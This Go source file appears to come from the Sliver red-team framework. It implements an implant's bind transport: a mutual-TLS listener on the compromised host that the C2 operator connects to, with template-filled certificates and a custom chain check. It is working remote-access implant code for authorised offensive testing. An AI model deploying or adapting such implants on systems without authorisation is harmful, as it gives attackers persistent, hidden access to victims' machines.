// Package bind carries the forward (bind) transport: the implant listens and
// the C2 dials in, which is the mirror image of every other transport here.
//
// The package clause sits OUTSIDE the build guard below, and that placement is
// load-bearing. Sliver renders each implant source file through text/template
// with .Config, and a file whose entire body is wrapped in a false conditional
// renders down to a bare comment with no package clause — which Go rejects with
// "expected 'package', found 'EOF'". Keeping `package bind` unconditional means
// a build without mTLS (a pivot-only implant, say) still produces a valid, empty
// package instead of a file that cannot compile.
package bind

// {{if .Config.IncludeMTLS}}

import (
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"net"
	"time"
)

// Bind reuses the mTLS build material with the TLS roles inverted.
//
// In the reverse mTLS transport the implant dials the C2, so the C2 is the TLS
// server: it presents its own certificate and verifies the
// implant's client certificate against the mtls-implant CA. A bind session runs
// the same handshake over a connection the C2 opened, which means the roles
// swap — the implant becomes the TLS server and the C2 becomes the client.
//
// Nothing new has to be issued for that. Sliver already ships two independent
// CAs, and each side already holds exactly what the swapped role needs:
//
//   - the implant presents certPEM/keyPEM, signed by the mtls-implant CA, which
//     is the CA the C2 already verifies client certificates against;
//   - the implant verifies the C2's client certificate against caCertPEM, which
//     is the mtls-server CA — the CA that signed the C2's own certificate.
//
// So the trust is mutual in both directions with no new CA, no new certificate
// and no change to the signing scheme.
var (
	// caCertPEM is the C2's CA certificate — the RootCAs pool the implant dials
	// against in the mTLS transport. Do not name the template action that fills
	// it in a comment: the renderer substitutes a multi-line PEM wherever the
	// action appears, and inside a // comment the PEM's newlines end the comment
	// and spill the certificate into the file as bare code.
	caCertPEM = `{{.Build.MtlsCACert}}`

	keyPEM  = `{{.Build.MtlsKey}}`
	certPEM = `{{.Build.MtlsCert}}`
)

// HandshakeTimeout bounds a single accepted connection's TLS handshake.
//
// Without it a client that opens a socket and then says nothing holds a
// goroutine and an fd for as long as it likes. A bind listener is by definition
// reachable by anything that can route to the port, so this is the difference
// between a scanner costing a connection attempt and a scanner costing the
// listener.
const HandshakeTimeout = 30 * time.Second

// tlsConfig builds the implant's TLS-server configuration.
func tlsConfig() (*tls.Config, error) {
	cert, err := tls.X509KeyPair([]byte(certPEM), []byte(keyPEM))
	if err != nil {
		return nil, fmt.Errorf("[bind] load implant certificate: %w", err)
	}

	// caCertPEM is the CA that signs C2 certificates. Requiring a client
	// certificate against it is what stops anything that merely reaches the
	// port from being treated as the operator: an unauthenticated peer cannot
	// complete the handshake, so it never reaches the envelope layer.
	pool := x509.NewCertPool()
	if !pool.AppendCertsFromPEM([]byte(caCertPEM)) {
		return nil, fmt.Errorf("[bind] build carries no usable CA certificate")
	}

	return &tls.Config{
		Certificates: []tls.Certificate{cert},

		// RequireAnyClientCert plus an explicit chain check, rather than
		// RequireAndVerifyClientCert. The C2's certificate is issued for *server*
		// auth, and a bind session is exactly the case where it is presented as
		// a client certificate; the default verification rejects it with
		// "certificate specifies an incompatible key usage". RequireAnyClientCert
		// still refuses a peer that presents no certificate at all, and the check
		// below is what actually establishes identity: the chain must terminate
		// at the CA this build carries.
		ClientAuth: tls.RequireAnyClientCert,
		VerifyPeerCertificate: func(rawCerts [][]byte, _ [][]*x509.Certificate) error {
			if len(rawCerts) == 0 {
				return fmt.Errorf("[bind] peer presented no certificate")
			}
			leaf, err := x509.ParseCertificate(rawCerts[0])
			if err != nil {
				return fmt.Errorf("[bind] parse peer certificate: %w", err)
			}
			intermediates := x509.NewCertPool()
			for _, raw := range rawCerts[1:] {
				if c, err := x509.ParseCertificate(raw); err == nil {
					intermediates.AddCert(c)
				}
			}
			if _, err := leaf.Verify(x509.VerifyOptions{
				Roots:         pool,
				Intermediates: intermediates,
				KeyUsages:     []x509.ExtKeyUsage{x509.ExtKeyUsageAny},
			}); err != nil {
				return fmt.Errorf("[bind] peer certificate is not signed by the C2 CA: %w", err)
			}
			return nil
		},
		MinVersion: tls.VersionTLS13,
	}, nil
}

// Listen opens the bind listener on address:port.
//
// An empty address means every interface, which is the useful default for a
// bind session: the whole point is to be reachable from wherever the operator
// is, and the caller chose to generate a bind implant precisely because the
// target cannot reach out.
func Listen(address string, port uint16) (net.Listener, error) {
	cfg, err := tlsConfig()
	if err != nil {
		return nil, err
	}
	if address == "" {
		address = "0.0.0.0"
	}
	return tls.Listen("tcp", fmt.Sprintf("%s:%d", address, port), cfg)
}

// Accept returns the next connection that completes a valid mutual-TLS
// handshake.
//
// Connections that fail the handshake are closed and skipped rather than
// returned as an error. A bind port is exposed to whatever can route to it, and
// a port scanner or a stray client hitting it is not a reason to tear down the
// listener and lose the session the operator is waiting to establish.
func Accept(ln net.Listener) (net.Conn, error) {
	for {
		conn, err := ln.Accept()
		if err != nil {
			return nil, err
		}

		tlsConn, ok := conn.(*tls.Conn)
		if !ok {
			// Only reachable if this listener was built by something else.
			conn.Close()
			continue
		}

		// tls.Listener.Accept returns before the handshake runs, so the
		// deadline below covers the handshake and nothing else.
		_ = tlsConn.SetDeadline(time.Now().Add(HandshakeTimeout))
		if err := tlsConn.Handshake(); err != nil {
			_ = tlsConn.Close()
			continue
		}
		_ = tlsConn.SetDeadline(time.Time{})

		return tlsConn, nil
	}
}

// {{end}} -IncludeMTLS
